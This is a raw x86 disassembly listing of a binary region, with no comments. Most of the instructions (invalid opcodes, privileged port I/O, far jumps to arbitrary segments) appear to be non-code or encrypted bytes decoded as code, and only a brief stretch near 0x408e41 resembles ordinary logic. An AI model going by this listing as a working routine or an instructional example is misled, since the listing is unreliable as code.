  408c53:	mov    fs,ebp
  408c55:	popa   
  408c56:	xor    bh,ah
  408c58:	mov    al,0xb8
  408c5a:	and    dh,BYTE PTR [esp+esi*4+0xb1983e3]
  408c61:	test   BYTE PTR [ecx],dl
  408c63:	xor    bl,al
  408c65:	pop    ebx
  408c66:	loope  0x408c5d
  408c68:	fiadd  WORD PTR [edx-0x6f]
  408c6b:	pusha  
  408c6c:	mov    cl,0x15
  408c6e:	in     al,dx
  408c6f:	in     al,dx
  408c70:	test   DWORD PTR [eax+0x68be21bc],eax
  408c76:	jns    0x408c57
  408c78:	and    DWORD PTR [eax-0x11a9a985],esp
  408c7e:	mov    bl,0x20
  408c80:	(bad)  
  408c81:	cld    
  408c82:	or     DWORD PTR [edx+0x25],ebx
  408c85:	mov    ss,WORD PTR [ecx+0x50]
  408c88:	mov    esp,0x858cec82
  408c8d:	out    dx,eax
  408c8e:	sbb    bh,BYTE PTR [ecx]
  408c90:	jle    0x408c28
  408c92:	push   0xa3aa1765
  408c97:	mov    dh,0x60
  408c99:	ja     0x408d15
  408c9b:	jmp    0x408ccc
  408c9d:	adc    BYTE PTR [eax+0x55c06813],al
  408ca3:	jb     0x408c2f
  408ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca6:	pop    ebp
  408ca7:	push   esi
  408ca8:	fist   DWORD PTR [esi+0x48b9e841]
  408cae:	xchg   BYTE PTR [ebx-0x5e],bl
  408cb1:	push   ecx
  408cb2:	mov    ecx,0x19efbcbf
  408cb7:	daa    
  408cb8:	mov    ecx,0xe8352b14
  408cbd:	pop    edx
  408cbe:	pop    esp
  408cbf:	dec    esi
  408cc0:	and    ecx,ebp
  408cc2:	enter  0x2fc9,0xf
  408cc6:	jne    0x408d45
  408cc8:	loop   0x408d33
  408cca:	sbb    BYTE PTR [esi],cl
  408ccc:	mov    al,ds:0x9ea87799
  408cd1:	dec    edx
  408cd2:	test   al,0x69
  408cd4:	aaa    
  408cd5:	fsubrp st(6),st
  408cd7:	xchg   DWORD PTR [ebp+0x5602bae3],edx
  408cdd:	nop
  408cde:	xchg   BYTE PTR [ecx+0x52],ah
  408ce1:	je     0x408ca9
  408ce3:	pop    edx
  408ce4:	stos   BYTE PTR es:[edi],al
  408ce5:	cld    
  408ce6:	(bad)  [ebp-0x737cdc57]
  408cec:	jnp    0x408d58
  408cee:	dec    ecx
  408cef:	push   es
  408cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cf2:	(bad)  
  408cf3:	jmp    0xf51498c6
  408cf8:	xor    al,0xb0
  408cfa:	sbb    ecx,DWORD PTR [ecx]
  408cfc:	out    dx,eax
  408cfd:	dec    ecx
  408cfe:	shl    BYTE PTR [edx+0x322beab5],1
  408d04:	clc    
  408d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d06:	push   edi
  408d07:	sub    DWORD PTR [esi],ebp
  408d09:	mov    ecx,0xec446e5a
  408d0e:	arpl   WORD PTR [ecx-0x4],ax
  408d11:	(bad)  
  408d12:	fisttp QWORD PTR [eax]
  408d14:	test   eax,0x77dd2566
  408d19:	cmp    al,0xc2
  408d1b:	jp     0x408ce0
  408d1d:	mov    bl,0x8a
  408d1f:	fsub   DWORD PTR [edi+ebp*8-0x6d86d082]
  408d26:	test   eax,0xccd27556
  408d2b:	cmp    al,BYTE PTR [ebx-0x6c9c5d9a]
  408d31:	jp     0x408d83
  408d33:	jno    0x408d99
  408d35:	push   0x710c7f3b
  408d3a:	fst    QWORD PTR [esi+0x3d3e0bc0]
  408d40:	cwde   
  408d41:	pop    DWORD PTR ds:0xbd49a041
  408d47:	xchg   BYTE PTR [ebp+0x42],ch
  408d4a:	(bad)  
  408d4b:	mov    ah,BYTE PTR [edi]
  408d4d:	or     DWORD PTR [eax],0x21
  408d50:	inc    ebp
  408d51:	popf   
  408d52:	je     0x408dce
  408d54:	push   esi
  408d55:	jns    0x512d2e71
  408d5b:	ror    DWORD PTR [ecx+0x2aba159e],1
  408d61:	mov    eax,0xb8eabfaf
  408d66:	neg    DWORD PTR ds:0xe0f0de94
  408d6c:	stos   DWORD PTR es:[edi],eax
  408d6d:	or     ebx,DWORD PTR [edi-0x42]
  408d70:	aad    0x59
  408d72:	(bad)
  408d75:	lock popf 
  408d77:	sub    DWORD PTR [eax+0x17],ebx
  408d7a:	pop    edi
  408d7b:	mov    eax,0xd77f1962
  408d80:	popa   
  408d81:	lods   eax,DWORD PTR gs:[esi]
  408d83:	outs   dx,BYTE PTR ds:[esi]
  408d84:	inc    ecx
  408d85:	or     al,0x9c
  408d87:	pop    ds
  408d88:	sub    eax,0x5339dfd6
  408d8d:	pop    ebp
  408d8e:	or     ebx,0x7
  408d91:	(bad)  
  408d92:	mov    edi,0xff10d663
  408d97:	call   FWORD PTR [ebx-0x1e6bf84c]
  408d9d:	fidivr WORD PTR [ecx-0x71]
  408da0:	mov    eax,ds:0x92198444
  408da5:	out    0x13,eax
  408da7:	inc    ebp
  408da8:	cmp    eax,0x8f835c82
  408dad:	jnp    0x408d8a
  408daf:	dec    edx
  408db0:	mov    esi,0xd35d0171
  408db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db6:	in     eax,0x98
  408db8:	lahf   
  408db9:	inc    ebx
  408dba:	mov    edi,0xa0b502e3
  408dbf:	sub    bh,BYTE PTR [ebp+0x31]
  408dc2:	leave  
  408dc3:	leave  
  408dc4:	out    dx,eax
  408dc5:	adc    ebp,DWORD PTR [edx+0x2a]
  408dc8:	sub    cl,BYTE PTR [esi-0x4b3b983c]
  408dce:	xor    al,0x3b
  408dd0:	mov    ds:0x5fe410cd,al
  408dd5:	bound  ebp,QWORD PTR [ebx]
  408dd7:	lahf   
  408dd8:	sbb    BYTE PTR [esi],ah
  408dda:	test   DWORD PTR [eax],edi
  408ddc:	or     eax,0xde76d1c6
  408de1:	aad    0x44
  408de3:	std    
  408de4:	pop    esp
  408de5:	add    esp,eax
  408de7:	or     eax,0xdae9e5c2
  408dec:	daa    
  408ded:	jns    0x408e3c
  408def:	push   ecx
  408df0:	in     al,0x55
  408df2:	or     dl,al
  408df4:	mov    gs,WORD PTR [esi+0x7a6e4019]
  408dfa:	hlt    
  408dfb:	je     0x408dda
  408dfd:	inc    DWORD PTR [esi+eax*2+0x1]
  408e01:	xchg   ecx,eax
  408e02:	aad    0xc0
  408e04:	sbb    DWORD PTR [esi-0x5b76335c],ebp
  408e0a:	push   eax
  408e0b:	sbb    dl,BYTE PTR [edi+0x2e]
  408e0e:	pop    ds
  408e0f:	scas   al,BYTE PTR es:[edi]
  408e10:	mov    edi,0xf7b4e4cf
  408e15:	xchg   ecx,eax
  408e16:	fld    TBYTE PTR [edi+edi*8]
  408e19:	jge    0x408e16
  408e1b:	jmp    0x408e2d
  408e1d:	ret    0xabda
  408e20:	adc    eax,0xcbc4936e
  408e25:	mov    ebx,0x4414c405
  408e2a:	mov    BYTE PTR [ebx],ah
  408e2c:	ror    DWORD PTR [esi*8+0x1c1e52e8],0xd6
  408e34:	pop    ss
  408e35:	mov    dl,0x30
  408e37:	(bad)  
  408e38:	arpl   WORD PTR [ebx-0xde10aa4],di
  408e3e:	repz sti 
  408e40:	dec    esp
  408e41:	shrd   eax,edx,0x2
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	pop    ds
  408e76:	jmp    0x408e03
  408e78:	jo     0x408eb4
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [edi-0x6e],ah
  408e83:	in     eax,0x2e
  408e85:	retf   
  408e86:	sbb    esp,DWORD PTR [ebp-0x57]
  408e89:	dec    ebx
  408e8b:	scas   eax,DWORD PTR es:[edi]
  408e8c:	sub    esp,DWORD PTR [eax+0x624c231e]
  408e92:	mov    eax,0x993dfbe8
  408e97:	inc    esp
  408e98:	(bad)  
  408e99:	jmp    0xf52c:0x825d1393
  408ea0:	cmp    DWORD PTR [eax+0x15],esi
  408ea3:	mov    edi,cs
  408ea5:	and    eax,0x29bee8e7
  408eaa:	pop    esi
  408eab:	cld    
  408eac:	out    dx,eax
  408ead:	xchg   al,bh
  408eaf:	dec    edi
  408eb0:	daa    
  408eb1:	stos   DWORD PTR es:[edi],eax
  408eb2:	aam    0x74
  408eb4:	mov    dl,0x52
  408eb6:	lock push edi
  408eb8:	repz adc ebp,esi
  408ebb:	sbb    edi,DWORD PTR [edx-0x47]
  408ebe:	js     0x408e71
  408ec0:	or     dh,BYTE PTR [ecx]
  408ec2:	or     dh,BYTE PTR [eax]
  408ec4:	cmc    
  408ec5:	cld    
  408ec6:	xchg   BYTE PTR [ebx+edx*1+0xa],dh
  408eca:	enter  0xc4ab,0xb
  408ece:	fdiv   st,st(2)
  408ed0:	mov    esp,0xcb68a9a8
  408ed5:	jae    0x408f4f
  408ed7:	aas    
  408ed8:	pop    eax
  408ed9:	push   ds
  408eda:	cmovle eax,eax
  408edd:	sbb    al,0xef
  408edf:	dec    edx
  408ee0:	shl    BYTE PTR [edi],1
  408ee2:	mov    bh,0xde
  408ee4:	push   0xbec369dd
  408ee9:	add    BYTE PTR ss:[esi+0x11],cl
  408eed:	adc    eax,0x2fca967
  408ef2:	push   eax
  408ef3:	or     BYTE PTR ds:0xe12ec877,cl
  408ef9:	ror    BYTE PTR [ebx],cl
  408efb:	add    eax,ebp
  408efd:	sbb    BYTE PTR [ebp-0x2731f5df],0xa6
  408f04:	(bad)  
  408f06:	adc    al,0x2e
  408f09:	pop    esi
  408f0a:	xor    esi,DWORD PTR [edi+0x34]
  408f0d:	js     0x408f13
  408f0f:	gs ds mov ah,0xf
  408f13:	mov    ecx,0x2c4f2996
  408f18:	int    0xa3
  408f1a:	repnz or ebp,DWORD PTR [ebp-0x7aee3b82]
  408f21:	nop
  408f22:	icebp  
  408f23:	mov    eax,ds:0x99fea6bb
  408f28:	and    BYTE PTR [ebx],ah
  408f2a:	call   0x8c4a:0x7f30f72
  408f31:	mov    edx,gs
  408f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f34:	push   cs
  408f35:	mov    ah,0x17
  408f37:	xor    BYTE PTR [esi-0x22],cl
  408f3a:	stc    
  408f3b:	in     al,0x83
  408f3d:	pop    eax
  408f3e:	cmp    ah,al
  408f40:	fisttp WORD PTR [eax-0x3]
  408f43:	mov    ?,WORD PTR [ecx]
  408f45:	scas   eax,DWORD PTR es:[edi]
  408f46:	inc    eax
  408f47:	xchg   ebx,eax
  408f48:	leave  
  408f49:	jp     0x408faa
  408f4b:	scas   al,BYTE PTR es:[edi]
  408f4c:	cmp    edx,ebx
  408f4e:	push   eax
  408f4f:	xor    al,0x57
  408f51:	jae    0x408eec
  408f53:	sub    ebx,edx
  408f55:	aam    0x7b
  408f57:	rcr    BYTE PTR [edx+0x7a788f1d],0x3
  408f5e:	jne    0x408fc5
  408f60:	iret   
  408f61:	pop    ss
  408f62:	or     ah,cl
  408f64:	ficomp DWORD PTR [ebp+0x67851f7]
  408f6a:	cdq    
  408f6b:	icebp  
  408f6c:	scas   al,BYTE PTR es:[edi]
  408f6d:	pusha  
  408f6e:	jge    0x408fc7
  408f70:	shl    DWORD PTR ds:0xefa9a957,0x17
  408f77:	sub    BYTE PTR [eax],0x14
  408f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f7b:	jae    0x408fde
  408f7d:	xor    BYTE PTR [ebp+0x7b],ch
  408f80:	mov    ebx,0x4a562874
  408f85:	rcr    BYTE PTR [ebx+0x66],0x74
  408f89:	popa   
  408f8a:	mov    al,0x35
  408f8c:	in     al,0xc3
  408f8e:	push   esp
  408f8f:	mov    bl,BYTE PTR [ebx]
  408f91:	pop    esp
  408f92:	or     ebx,0xb25c6030
  408f98:	lds    edx,FWORD PTR [ecx]
  408f9a:	sub    ebx,edx
  408f9c:	aam    0x8d
  408f9e:	mov    ecx,0x4e80eb79
  408fa3:	jne    0x408f89
  408fa5:	sbb    edx,DWORD PTR [ebp-0x95572be]
  408fab:	fmul   QWORD PTR [edi-0x3d]
  408fae:	(bad)  
  408faf:	xor    al,BYTE PTR [ebx+eiz*8-0x35]
  408fb3:	mov    eax,0xcef2168b
  408fb8:	push   ecx
  408fb9:	sbb    ebx,DWORD PTR [esi+0x597f8174]
  408fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc0:	and    DWORD PTR [ebp-0x64],ecx
  408fc3:	test   ebp,edx
  408fc5:	inc    ebp
  408fc6:	(bad)  
  408fc7:	push   edx
  408fc8:	(bad)  
  408fc9:	stos   DWORD PTR es:[edi],eax
  408fca:	push   ss
  408fcb:	and    BYTE PTR [esi+0x67],cl
  408fce:	jo     0x408fb5
  408fd0:	nop
  408fd1:	sbb    ch,BYTE PTR [esi+ebx*4-0x7dbff652]
  408fd8:	xor    eax,0xbfcb0386
  408fdd:	out    dx,al
  408fde:	imul   edx,DWORD PTR [eax-0x5d],0xd93d55a1
  408fe5:	xlat   BYTE PTR ds:[ebx]
  408fe6:	push   ebx
  408fe7:	rol    BYTE PTR [esi+0x37a9307a],cl
  408fed:	nop
  408fee:	leave  
  408fef:	sub    dh,cl
  408ff1:	inc    esi
  408ff2:	xchg   ebx,eax
  408ff3:	mov    bl,0xe9
  408ff5:	and    dh,BYTE PTR [ecx]
  408ff7:	add    eax,0x6304f8a2
  408ffc:	outs   dx,BYTE PTR ds:[esi]
  408ffd:	sahf   
  408ffe:	adc    ebp,DWORD PTR [ebp+edx*8+0x31f5247f]
  409005:	fidiv  DWORD PTR [ebx+ebp*4-0x28]
  409009:	leave  
  40900a:	fdiv   st(0),st
  40900c:	jp     0xbf99fa3f
  409012:	out    dx,al
  409013:	hlt    
  409014:	lods   eax,DWORD PTR ds:[esi]
  409015:	loopne 0x408fdb
  409017:	out    dx,al
  409018:	jg     0x40902d
  40901a:	jae    0x408fd0
  40901c:	jnp    0x409080
  40901e:	sub    eax,0xa09aad82
  409023:	ret    0x757b
  409026:	or     eax,0xd15ef14f
  40902b:	ds or  ah,al
  40902e:	adc    al,0x89
  409030:	cmp    cl,BYTE PTR [edi]
  409032:	cmp    al,0x2e
  409034:	aaa    
  409035:	sbb    eax,0x9e67d04
  40903a:	hlt    
  40903b:	sahf   
  40903c:	popf   
  40903d:	jmp    0x8048:0xe63de96b
  409044:	fdivrp st(6),st
  409046:	push   edx
  409047:	push   edi
  409048:	test   edi,ecx
  40904a:	mov    ds:0x14d09d18,eax
  40904f:	(bad)  
  409050:	dec    esi
  409051:	mov    cl,BYTE PTR [ebx+0x23]
  409054:	push   ss
  409055:	fld    TBYTE PTR [eax-0x56]
  409058:	mov    eax,0xe57b07f0
  40905d:	scas   eax,DWORD PTR es:[edi]
  40905e:	aas    
  40905f:	jg     0x408fe7
  409061:	lods   al,BYTE PTR ds:[esi]
  409062:	sub    DWORD PTR [edx-0x71],edi
  409065:	imul   esi,esp,0x1ad1d7f9
  40906b:	outs   dx,BYTE PTR ds:[esi]
  40906c:	xor    al,0x28
  40906e:	xchg   esi,eax
  40906f:	push   edi
  409070:	outs   dx,DWORD PTR ds:[esi]
  409071:	and    eax,0xa2e84173
  409076:	mov    eax,ds:0xa258e420
  40907b:	ror    eax,1
  40907d:	add    eax,0x341d7546
  409082:	xchg   esp,eax
  409083:	icebp  
  409084:	ins    BYTE PTR es:[edi],dx
  409085:	lea    eax,[ecx+0x22]
  409088:	xchg   ecx,eax
  409089:	in     eax,dx
  40908a:	mov    DWORD PTR [esi+0x382af3b],ebx
  409090:	int3   
  409091:	not    DWORD PTR [ecx]
  409093:	fmul   DWORD PTR [ebx+0x51ae0125]
  409099:	or     esi,DWORD PTR [esi]
  40909b:	in     al,dx
  40909c:	cmc    
  40909d:	mov    ebx,0x2cd450fe
  4090a2:	rep outs dx,DWORD PTR ds:[esi]
  4090a4:	hlt    
  4090a5:	cmp    al,0xb
  4090a7:	std    
  4090a8:	stc    
  4090a9:	retf   
  4090aa:	xchg   esp,eax
  4090ab:	call   0x6fff0048
  4090b0:	lahf   
  4090b1:	mov    edi,0x50653a8
  4090b6:	jle    0x4090e9
  4090b8:	add    DWORD PTR [ebp+0x65],0xa
  4090bc:	clc    
  4090bd:	xlat   BYTE PTR ds:[ebx]
  4090be:	popa   
  4090bf:	jp     0x4090f9
  4090c1:	xchg   ecx,eax
  4090c2:	rcr    DWORD PTR [ebx+0x7e],0xd8
  4090c6:	mov    cl,0x1a
  4090c8:	push   ds
  4090c9:	imul   esi,DWORD PTR [edi+eiz*8],0x4a99ffb3
  4090d0:	push   edx
  4090d1:	push   ebx
  4090d2:	mov    esi,0x469a08fa
  4090d7:	xchg   ebx,eax
  4090d8:	mov    ebp,0x3a39e29f
  4090dd:	lds    ecx,FWORD PTR [ebp+0x79]
  4090e0:	mov    al,0xbb
  4090e2:	les    eax,FWORD PTR [ebx+edi*2+0x4b]
  4090e6:	test   eax,0xdca5b095
  4090eb:	pop    es
  4090ec:	mov    al,ds:0xdd9baa74
  4090f1:	fcomp  DWORD PTR [eax+eax*4]
  4090f4:	loop   0x40912b
  4090f6:	xchg   DWORD PTR [edx+0x26],edi
  4090f9:	xchg   edi,eax
  4090fa:	add    cl,ch
  4090fc:	outs   dx,DWORD PTR ds:[esi]
  4090fd:	mov    ebp,0x5c241a57
  409102:	pop    eax
  409103:	lods   eax,DWORD PTR ds:[esi]
  409104:	mov    WORD PTR [esp+edi*1+0x4f],?
  409108:	call   0xe70c0ef7
  40910d:	jge    0x409166
  40910f:	jmp    0x4090e8
  409111:	int3   
  409112:	neg    DWORD PTR [eax]
  409114:	fs pop edi
  409116:	mov    edi,DWORD PTR [ecx+0x51]
  409119:	pop    esp
  40911a:	out    dx,eax
  40911b:	rcr    BYTE PTR [edx-0x6b],cl
  40911e:	cmp    ebp,DWORD PTR [edi+0x9]
  409121:	mov    WORD PTR [ebx-0x65],fs
  409124:	jmp    0x6d8b:0xa8d5f2aa
  40912b:	sar    BYTE PTR [ebx-0x6f],0x9d
  40912f:	repz dec esi
  409131:	adc    al,0xee
  409133:	mov    DWORD PTR [edx+ebp*1],eax
  409136:	cmp    al,BYTE PTR [eax-0x13a9dd74]
  40913c:	adc    eax,0x1f889de0
  409141:	sar    DWORD PTR [ebp-0xcdecfe9],cl
  409147:	push   ss
  409148:	jp     0x409126
  40914a:	iret   
  40914b:	scas   al,BYTE PTR es:[edi]
  40914c:	adc    al,BYTE PTR [ecx]
  40914e:	addr16 addr16 inc eax
  409151:	shl    DWORD PTR [ebp+0x60783611],1
  409157:	or     BYTE PTR ds:0x8d2df67,0x6f
  40915e:	sub    al,0x3f
  409160:	ins    BYTE PTR es:[edi],dx
  409161:	or     cl,0xfe
  409164:	dec    ebx
  409165:	sub    DWORD PTR [esi+0xc],esi
  409168:	cmp    DWORD PTR [ebx],0x37
  40916b:	mov    esi,0x5fff1f1e
  409170:	je     0x409176
  409172:	inc    ebp
  409173:	repnz push es
  409175:	jne    0x4091c5
  409177:	jno    0x4091b6
  409179:	sbb    DWORD PTR [eax],esp
  40917b:	mov    ch,0x4e
  40917d:	hlt    
  40917e:	aaa    
  40917f:	xchg   esp,eax
  409180:	scas   eax,DWORD PTR es:[edi]
  409181:	dec    eax
  409182:	jle    0x40916d
  409184:	and    BYTE PTR [eax+0x2e],bh
  409187:	mov    ah,0xea
  409189:	dec    ecx
  40918a:	call   0xc5ac:0x96395bea
  409191:	(bad)  
  409192:	mov    ebp,0xb4d0c04f
  409197:	cwde   
  409198:	xchg   si,ax
  40919a:	pop    es
  40919b:	jg     0x4091de
  40919d:	xchg   ecx,eax
  40919e:	jge    0x40917d
  4091a0:	cmc    
  4091a1:	shr    BYTE PTR [edi-0x207990f1],1
  4091a7:	jge    0x4091f1
  4091a9:	sbb    BYTE PTR [eax-0x611bf6d5],dh
  4091af:	or     dl,dh
  4091b1:	sub    eax,esp
  4091b3:	mov    al,BYTE PTR [esi+0x35]
  4091b6:	sbb    DWORD PTR [ebx+0x66],esp
  4091b9:	adc    ebx,edx
  4091bb:	fsubrp st(3),st
  4091bd:	push   es
  4091be:	or     al,0x89
  4091c0:	cmp    ah,BYTE PTR [ebp+0x18]
  4091c3:	push   ss
  4091c4:	mov    cl,0x8e
  4091c6:	lock jne 0x4091c9
  4091c9:	mul    BYTE PTR [edx]
  4091cb:	(bad)  
  4091cc:	int    0xd3
  4091ce:	repnz stos DWORD PTR es:[edi],eax
  4091d0:	std    
  4091d1:	fs stos DWORD PTR es:[edi],eax
  4091d3:	cs clc 
  4091d5:	scas   eax,DWORD PTR es:[edi]
  4091d6:	popa   
  4091d7:	push   0xffffffad
  4091d9:	fbld   TBYTE PTR [edi-0x13]
  4091dc:	cmp    dh,BYTE PTR [eax]
  4091de:	push   esi
  4091df:	xchg   edi,eax
  4091e0:	btc    DWORD PTR [edi],edi
  4091e3:	inc    edx
  4091e4:	mov    cl,0x74
  4091e6:	sbb    DWORD PTR [edi+ecx*1],ebp
  4091e9:	sar    DWORD PTR [ebx+ebx*8],1
  4091ec:	sbb    eax,0x952900ab
  4091f1:	es pusha 
  4091f3:	icebp  
  4091f4:	inc    dh
  4091f6:	fmul   st(1),st
  4091f8:	outs   dx,DWORD PTR ds:[esi]
  4091f9:	pop    esi
  4091fa:	je     0x409253
  4091fc:	ja     0x4091b0
  4091fe:	(bad)  [ebx+ebx*2+0x6e245741]
  409205:	aas    
  409206:	cmp    dl,dh
  409208:	aaa    
  409209:	fstp   DWORD PTR [eax-0x69920f45]
  40920f:	bound  edi,QWORD PTR ds:0xe2d3a41a
  409215:	rcl    DWORD PTR [esi-0x24],cl
  409218:	cmp    DWORD PTR [esi-0x51fde694],ebp
  40921e:	out    0x4,al
  409220:	pusha  
  409221:	ret    0x12ca
  409224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409225:	aad    0xdd
  409227:	retf   
  409228:	das    
  409229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40922a:	push   ds
  40922b:	scas   eax,DWORD PTR es:[edi]
  40922c:	test   al,0x4b
  40922e:	repz (bad) 
  409230:	mov    ecx,0x6336f2e9
  409235:	push   esp
  409236:	mov    edi,0x491e1b94
  40923b:	xchg   DWORD PTR [eax+edx*2+0x4a],ecx
  40923f:	out    dx,al
  409240:	les    ebx,FWORD PTR [ebp+0x33]
  409243:	ror    BYTE PTR [edi],cl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	ret    0x3302
  409249:	ror    DWORD PTR [ecx-0x2616f3ab],1
  40924f:	add    eax,DWORD PTR [eax]
  409251:	add    dl,ah
  409253:	and    eax,0xea26ea26
  409258:	sbb    bl,BYTE PTR ds:0x70a1617f
  40925e:	push   eax
  40925f:	in     al,dx
  409260:	dec    ebp
  409261:	jle    0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [edi+0x43f7dc8e],bl
  40926f:	cdq    
  409270:	inc    ecx
  409271:	or     BYTE PTR [ebp+0xa],cl
  409274:	and    BYTE PTR [eax+0xe],bl
  409277:	dec    edx
  409278:	imul   edi,DWORD PTR [ebp+0x1f],0xffffffbf
  40927c:	jbe    0x40924a
  40927e:	jnp    0x409273
  409280:	in     eax,dx
  409281:	enter  0xa37c,0xa8
  409285:	sub    ebp,ebx
  409287:	sub    eax,0x73a162b8
  40928c:	push   ebp
  40928d:	pushf  
  40928e:	mov    edx,0x2ec0ca43
  409293:	xor    eax,0x639ac1fa
  409298:	xor    BYTE PTR [ebp+0x5a87dcfd],0xfb
  40929f:	push   ebx
  4092a0:	push   ss
  4092a1:	les    esi,FWORD PTR [ebp+0x5bbf3069]
  4092a7:	xor    eax,0xc239a891
  4092ac:	pop    eax
  4092ad:	sub    al,0x13
  4092af:	ficom  WORD PTR [edx+0x56]
  4092b2:	pop    esp
  4092b3:	call   0xbe4d:0xc9bc093b
  4092ba:	ficomp DWORD PTR [esi-0x23303d93]
  4092c0:	call   0x3aced7f3
  4092c5:	std    
  4092c6:	jmp    0xf3aa:0xee2c7413
  4092cd:	add    al,0x4c
  4092cf:	inc    eax
  4092d0:	retf   
  4092d1:	mov    dh,0x5c
  4092d4:	(bad)  
  4092d5:	push   esi
  4092d6:	div    BYTE PTR [ebx-0x33]
  4092d9:	push   bx
  4092db:	jg     0x4092d0
  4092dd:	fneni(8087 only) 
  4092df:	jp     0x40926a
  4092e1:	rcl    esp,cl
  4092e3:	rcr    BYTE PTR [edx],1
  4092e5:	ja     0x4092a9
  4092e7:	mov    dl,0x2e
  4092e9:	not    BYTE PTR [eax]
  4092eb:	sub    al,0x82
  4092ed:	inc    esi
  4092ee:	and    edx,DWORD PTR [eax+edi*1-0x26]
  4092f2:	es jmp 0x4092a9
  4092f5:	pop    esi
  4092f6:	test   DWORD PTR cs:[edi],ebx
  4092f9:	sub    edx,DWORD PTR [eax]
  4092fb:	scas   al,BYTE PTR es:[edi]
  4092fc:	scas   eax,DWORD PTR es:[edi]
  4092fd:	out    0xcf,eax
  4092ff:	ja     0x409315
  409301:	in     eax,dx
  409302:	mov    al,dl
  409304:	add    al,0xd6
  409306:	fistp  QWORD PTR [eax-0x1ad0cf01]
  40930c:	(bad)  
  40930e:	mov    al,ds:0x3cc48ca9
  409313:	push   ebx
  409315:	scas   eax,DWORD PTR es:[edi]
  409316:	mov    ch,0xb6
  409318:	rcl    BYTE PTR [ebx+edx*1],0x4e
  40931c:	pop    edx
  40931d:	xchg   DWORD PTR [edx-0x488709b0],ecx
  409323:	aam    0x13
  409325:	popf   
  409326:	mov    ecx,0x3deacf97
  40932b:	add    BYTE PTR [edi],al
  40932d:	leave  
  40932e:	pushf  
  40932f:	jne    0x409395
  409331:	jnp    0x409335
  409333:	fmulp  st(1),st
  409335:	rcl    ch,0x5e
  409338:	lock pusha 
  40933a:	add    cl,BYTE PTR ds:0x14d20ce9
  409340:	mov    DWORD PTR [esi],eax
  409342:	jl     0x40939a
  409344:	fist   WORD PTR [edx+0x18]
  409347:	retf   0xd0b9
  40934a:	jmp    0x409333
  40934c:	mov    ds:0x695fb620,eax
  409351:	adc    esp,DWORD PTR [ebx]
  409353:	pop    edx
  409354:	es dec edi
  409356:	mov    esi,0x61c8f260
  40935b:	or     al,0x77
  40935e:	jns    0x409383
  409360:	in     eax,0x1e
  409362:	call   FWORD PTR [edx-0xb18cef9]
  409368:	into   
  409369:	push   esp
  40936a:	pop    ss
  40936b:	mov    bh,0x89
  40936d:	push   eax
  40936e:	popf   
  40936f:	pop    ss
  409370:	cmp    esp,DWORD PTR [ecx]
  409372:	(bad)  
  409373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409374:	push   esi
  409375:	test   BYTE PTR [eax-0x5a6c64f8],bh
  40937b:	fld    QWORD PTR [ecx-0x2]
  40937e:	sti    
  40937f:	sahf   
  409380:	sbb    eax,0x5189f113
  409385:	jp     0x4093c4
  409387:	mov    ah,0x79
  409389:	fadd   QWORD PTR [edi]
  40938b:	xchg   esi,eax
  40938c:	scas   al,BYTE PTR es:[edi]
  40938d:	out    0x56,al
  40938f:	and    bl,BYTE PTR [edi+ebx*2]
  409392:	mov    cl,0x9c
  409394:	add    ch,cl
  409396:	xchg   BYTE PTR [edi-0x68],al
  409399:	cld    
  40939a:	push   ebp
  40939b:	ins    DWORD PTR es:[edi],dx
  40939c:	fist   DWORD PTR [esp+ecx*1-0xd728947]
  4093a3:	out    dx,al
  4093a4:	xor    edi,DWORD PTR [edx]
  4093a6:	and    esi,DWORD PTR [esi+0x408ad857]
  4093ac:	push   esp
  4093ad:	dec    esp
  4093ae:	mov    BYTE PTR [ebx+0x71],al
  4093b1:	and    DWORD PTR [ebp+0x26],edx
  4093b4:	and    esi,ecx
  4093b6:	adc    al,0x4b
  4093b8:	adc    BYTE PTR [edi+0x5a],0x17
  4093bc:	sub    ch,BYTE PTR [edx+0x58]
  4093bf:	sti    
  4093c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c1:	jmp    0x409415
  4093c3:	jns    0x4093b2
  4093c5:	xor    ecx,edi
  4093c7:	jb     0x409416
  4093c9:	mov    bl,0xd
  4093cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093cc:	imul   esi,DWORD PTR [edi+0x34790c79],0xffffffea
  4093d3:	jmp    0x7648aa2d
  4093d8:	icebp  
  4093d9:	(bad)  
  4093db:	mov    ss,ecx
  4093dd:	leave  
  4093de:	scas   al,BYTE PTR es:[edi]
  4093df:	inc    ah
  4093e1:	iret   
  4093e2:	mov    edi,0xf282133c
  4093e7:	icebp  
  4093e8:	stos   BYTE PTR es:[edi],al
  4093e9:	and    ch,BYTE PTR [eax]
  4093eb:	sub    bh,BYTE PTR [esi-0x4c]
